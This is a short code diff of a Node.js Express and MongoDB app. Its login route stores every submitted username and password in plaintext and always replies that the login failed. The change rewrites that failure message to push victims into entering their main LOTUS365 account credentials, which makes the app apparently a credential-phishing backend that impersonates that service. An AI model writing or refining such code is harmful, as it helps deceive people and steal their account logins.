@@ -16,7 +16,7 @@ mongoose.connect(process.env.MONGO_URI)
   .then(() => console.log("MongoDB Connected"))
   .catch(err => console.log("DB Error:", err));
 
-// ✅ Schema now only has username + password
+// Schema: only username + password
 const Login = mongoose.model('Login', {
   username: String,
   password: String
@@ -35,9 +35,11 @@ app.post('/login', async (req, res) => {
     // Save username + password
     await Login.create({ username, password });
 
+    // Custom message
     res.send(`
       <h2 style="text-align:center; color:red; margin-top:100px;">
-        invalid login, please try again
+       "Invalid login details. Please try again. For full access to all markets,
+        kindly log in using your main LOTUS365 account username and password."
       </h2>
     `);
 
